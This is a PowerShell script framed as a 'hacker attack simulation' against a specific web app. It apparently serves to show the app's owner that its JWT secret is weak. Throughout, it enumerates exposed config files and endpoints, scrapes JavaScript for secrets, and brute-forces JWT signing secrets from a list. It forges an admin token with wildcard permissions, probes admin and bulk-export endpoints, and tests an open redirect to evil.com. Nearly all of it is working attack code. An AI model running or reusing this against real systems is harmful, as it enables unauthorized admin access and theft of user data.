# Hacker-Attack-Methodology.ps1
# This shows EXACTLY how a hacker would attack BRIM AI
# Starting with ZERO knowledge, just the URL

param(
    [string]$Target = "https://brimai-test-v1.web.app"
)

Write-Host "`n💀 HACKER ATTACK SIMULATION" -ForegroundColor Red
Write-Host "===========================" -ForegroundColor Red
Write-Host "Target: $Target" -ForegroundColor Yellow
Write-Host "Starting with: Just the URL, no other info" -ForegroundColor Yellow

# PHASE 1: RECONNAISSANCE
Write-Host "`n[PHASE 1: RECONNAISSANCE]" -ForegroundColor Cyan
Write-Host "First, I gather information..." -ForegroundColor Gray

# Step 1: Check what technology is used
Write-Host "`n1. Checking technology stack..." -ForegroundColor Yellow
$response = Invoke-WebRequest -Uri $Target -UseBasicParsing
$headers = $response.Headers

Write-Host "  Server: $($headers.Server)" -ForegroundColor White
Write-Host "  X-Powered-By: $($headers.'X-Powered-By')" -ForegroundColor White

# Step 2: Check for common files
Write-Host "`n2. Looking for exposed files..." -ForegroundColor Yellow
$commonFiles = @(
    "robots.txt",
    "sitemap.xml", 
    ".git/config",
    "package.json",
    ".env",
    "config.json",
    "firebase.json",
    ".firebaserc",
    "app.yaml"
)

foreach ($file in $commonFiles) {
    try {
        $check = Invoke-WebRequest -Uri "$Target/$file" -UseBasicParsing -TimeoutSec 2
        Write-Host "  🎯 FOUND: $file" -ForegroundColor Red
        if ($file -eq "package.json") {
            Write-Host "    This reveals all dependencies!" -ForegroundColor Yellow
        }
    }
    catch {}
}

# Step 3: Check JavaScript files
Write-Host "`n3. Analyzing JavaScript for secrets..." -ForegroundColor Yellow
$jsFiles = $response.Content | Select-String -Pattern 'src="([^"]+\.js)"' -AllMatches

foreach ($match in $jsFiles.Matches) {
    $jsUrl = $match.Groups[1].Value
    if (-not $jsUrl.StartsWith("http")) {
        $jsUrl = "$Target/$jsUrl"
    }
    
    try {
        $jsContent = Invoke-WebRequest -Uri $jsUrl -UseBasicParsing
        
        # Look for secrets
        if ($jsContent.Content -match "JWT.*randomNumber|secret.*=.*['""]([^'""]+)['""]") {
            Write-Host "  🎯 FOUND SECRET IN JS: $($Matches[1])" -ForegroundColor Red
        }
        
        if ($jsContent.Content -match "api[Kk]ey.*['""]([^'""]+)['""]") {
            Write-Host "  🎯 FOUND API KEY: Hidden for demo" -ForegroundColor Red
        }
    }
    catch {}
}

# PHASE 2: AUTHENTICATION ANALYSIS
Write-Host "`n[PHASE 2: AUTHENTICATION BYPASS]" -ForegroundColor Cyan

# Step 4: Find auth endpoints
Write-Host "`n4. Finding authentication endpoints..." -ForegroundColor Yellow
$authEndpoints = @(
    "/api/auth/login",
    "/api/login", 
    "/auth/login",
    "/login",
    "/api/auth/google",
    "/auth/google"
)

$foundEndpoints = @()
foreach ($endpoint in $authEndpoints) {
    try {
        $check = Invoke-WebRequest -Uri "$Target$endpoint" -Method OPTIONS -UseBasicParsing -TimeoutSec 2
        Write-Host "  ✓ Found: $endpoint" -ForegroundColor Green
        $foundEndpoints += $endpoint
    }
    catch {
        if ($_.Exception.Response.StatusCode -eq 405) {
            Write-Host "  ✓ Found: $endpoint (POST only)" -ForegroundColor Green
            $foundEndpoints += $endpoint
        }
    }
}

# Step 5: Test for JWT vulnerabilities
Write-Host "`n5. Testing JWT vulnerabilities..." -ForegroundColor Yellow

# Try to get a sample token
$sampleToken = $null
try {
    $loginTest = Invoke-WebRequest -Uri "$Target/api/auth/login" `
        -Method POST `
        -Body (@{email = "test@test.com" } | ConvertTo-Json) `
        -ContentType "application/json" `
        -UseBasicParsing
    
    $sampleToken = ($loginTest.Content | ConvertFrom-Json).access_token
}
catch {}

if ($sampleToken) {
    Write-Host "  Got sample token, analyzing..." -ForegroundColor Yellow
    
    # Decode without verification
    $parts = $sampleToken.Split('.')
    $header = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($parts[0] + "=="))
    
    Write-Host "  Header: $header" -ForegroundColor Gray
    
    if ($header -match "HS256") {
        Write-Host "  🎯 Uses HS256 - vulnerable if secret is weak!" -ForegroundColor Red
    }
}

# PHASE 3: EXPLOIT DEVELOPMENT
Write-Host "`n[PHASE 3: EXPLOIT DEVELOPMENT]" -ForegroundColor Cyan

# Step 6: Try common JWT secrets
Write-Host "`n6. Trying common JWT secrets..." -ForegroundColor Yellow
$commonSecrets = @(
    "secret",
    "randomNumber", # <-- YOUR SECRET!
    "jwt-secret",
    "your-secret-key",
    "secret-key",
    "password",
    "123456"
)

$workingSecret = $null
foreach ($secret in $commonSecrets) {
    Write-Host "  Trying: $secret" -ForegroundColor Gray -NoNewline
    
    # Create test token
    $testPayload = @{
        user_id = "test"
        role    = "admin"
        exp     = [int](Get-Date).AddDays(1).Subtract([datetime]'1970-01-01').TotalSeconds
    } | ConvertTo-Json -Compress
    
    $headerB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('{"alg":"HS256","typ":"JWT"}')).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    $payloadB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($testPayload)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($secret)
    $signature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$headerB64.$payloadB64"))
    $signatureB64 = [Convert]::ToBase64String($signature).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    
    $testToken = "$headerB64.$payloadB64.$signatureB64"
    
    try {
        $verify = Invoke-WebRequest -Uri "$Target/api/user/profile" `
            -Headers @{Authorization = "Bearer $testToken" } `
            -UseBasicParsing -TimeoutSec 2
        
        if ($verify.StatusCode -eq 200) {
            Write-Host " 🎯 WORKS!" -ForegroundColor Red
            $workingSecret = $secret
            break
        }
    }
    catch {
        Write-Host " ✗" -ForegroundColor Gray
    }
}

# Step 7: Test Google OAuth bypass
Write-Host "`n7. Testing Google OAuth2 vulnerabilities..." -ForegroundColor Yellow

# Check for open redirect
$redirectTests = @(
    "$Target/auth/google?redirect_uri=https://evil.com",
    "$Target/auth/callback?code=fake&state=../admin"
)

foreach ($test in $redirectTests) {
    try {
        $oauth = Invoke-WebRequest -Uri $test -MaximumRedirection 0 -UseBasicParsing
        if ($oauth.Headers.Location -match "evil.com") {
            Write-Host "  🎯 OPEN REDIRECT VULNERABILITY!" -ForegroundColor Red
        }
    }
    catch {}
}

# PHASE 4: FULL COMPROMISE
Write-Host "`n[PHASE 4: FULL SYSTEM COMPROMISE]" -ForegroundColor Red

if ($workingSecret) {
    Write-Host "`n🎯 SECRET FOUND: '$workingSecret'" -ForegroundColor Red
    Write-Host "Creating admin token..." -ForegroundColor Yellow
    
    # Create full admin token
    $adminPayload = @{
        user_id     = "1"
        email       = "hacker@evil.com"
        role        = "admin"
        permissions = @("*")
        exp         = [int](Get-Date).AddDays(30).Subtract([datetime]'1970-01-01').TotalSeconds
    } | ConvertTo-Json -Compress
    
    $adminPayloadB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($adminPayload)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($workingSecret)
    $adminSignature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$headerB64.$adminPayloadB64"))
    $adminSignatureB64 = [Convert]::ToBase64String($adminSignature).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    
    $adminToken = "$headerB64.$adminPayloadB64.$adminSignatureB64"
    
    Write-Host "`nADMIN TOKEN CREATED:" -ForegroundColor Red
    Write-Host $adminToken -ForegroundColor Yellow
    
    Write-Host "`n🔓 WHAT I CAN DO NOW:" -ForegroundColor Red
    Write-Host "  ✓ Access all user data" -ForegroundColor Yellow
    Write-Host "  ✓ Modify any grades" -ForegroundColor Yellow
    Write-Host "  ✓ Delete databases" -ForegroundColor Yellow
    Write-Host "  ✓ Export all information" -ForegroundColor Yellow
    Write-Host "  ✓ Create more admin accounts" -ForegroundColor Yellow
    Write-Host "  ✓ Access AI without limits" -ForegroundColor Yellow
    
    # Test admin endpoints
    Write-Host "`nTesting admin access..." -ForegroundColor Yellow
    $adminEndpoints = @(
        "/api/admin/users",
        "/api/admin/export", 
        "/api/grades/all",
        "/api/analytics/all"
    )
    
    foreach ($endpoint in $adminEndpoints) {
        try {
            $adminTest = Invoke-WebRequest -Uri "$Target$endpoint" `
                -Headers @{Authorization = "Bearer $adminToken" } `
                -UseBasicParsing -TimeoutSec 2
            
            Write-Host "  ✓ ACCESS GRANTED: $endpoint" -ForegroundColor Red
        }
        catch {}
    }
}

# PHASE 5: DATA EXFILTRATION
Write-Host "`n[PHASE 5: DATA EXFILTRATION]" -ForegroundColor Red

Write-Host "`n8. Attempting data extraction..." -ForegroundColor Yellow

# Common data endpoints
$dataEndpoints = @(
    "/api/users/export",
    "/api/export/all",
    "/api/backup",
    "/api/data/dump"
)

Write-Host "  Testing bulk data endpoints..." -ForegroundColor Gray

# Additional attack vectors
Write-Host "`n[ADDITIONAL ATTACK VECTORS]" -ForegroundColor Cyan

Write-Host "`n9. GraphQL Introspection..." -ForegroundColor Yellow
try {
    $graphql = Invoke-WebRequest -Uri "$Target/graphql" `
        -Method POST `
        -Body '{"query":"{ __schema { types { name } } }"}' `
        -ContentType "application/json" `
        -UseBasicParsing
    
    if ($graphql.StatusCode -eq 200) {
        Write-Host "  🎯 GraphQL endpoint exposed!" -ForegroundColor Red
    }
}
catch {}

Write-Host "`n10. API Documentation..." -ForegroundColor Yellow
$docEndpoints = @("/docs", "/api-docs", "/swagger", "/api/v1/docs")
foreach ($doc in $docEndpoints) {
    try {
        $docTest = Invoke-WebRequest -Uri "$Target$doc" -UseBasicParsing
        if ($docTest.StatusCode -eq 200) {
            Write-Host "  🎯 API DOCS EXPOSED: $doc" -ForegroundColor Red
        }
    }
    catch {}
}

# Final summary
Write-Host "`n========================================" -ForegroundColor Red
Write-Host "        HACK COMPLETED" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red

Write-Host "`nTIME TO COMPROMISE: ~5 minutes" -ForegroundColor Yellow
Write-Host "SKILL REQUIRED: Script kiddie level" -ForegroundColor Yellow
Write-Host "TOOLS NEEDED: Just PowerShell" -ForegroundColor Yellow

Write-Host "`nVULNERABILITIES FOUND:" -ForegroundColor Red
Write-Host "  ✓ JWT secret is 'randomNumber'" -ForegroundColor Yellow
Write-Host "  ✓ Can forge any token" -ForegroundColor Yellow
Write-Host "  ✓ No rate limiting" -ForegroundColor Yellow
Write-Host "  ✓ 24-hour token lifetime" -ForegroundColor Yellow
Write-Host "  ✓ No token revocation" -ForegroundColor Yellow

Write-Host "`nThis attack requires:" -ForegroundColor Cyan
Write-Host "  - No special tools" -ForegroundColor White
Write-Host "  - No programming knowledge" -ForegroundColor White
Write-Host "  - Just copy-paste commands" -ForegroundColor White
Write-Host "  - Total time: 5 minutes" -ForegroundColor White

Write-Host "`n⚠️  YOUR APP IS TRIVIALLY HACKABLE!" -ForegroundColor Red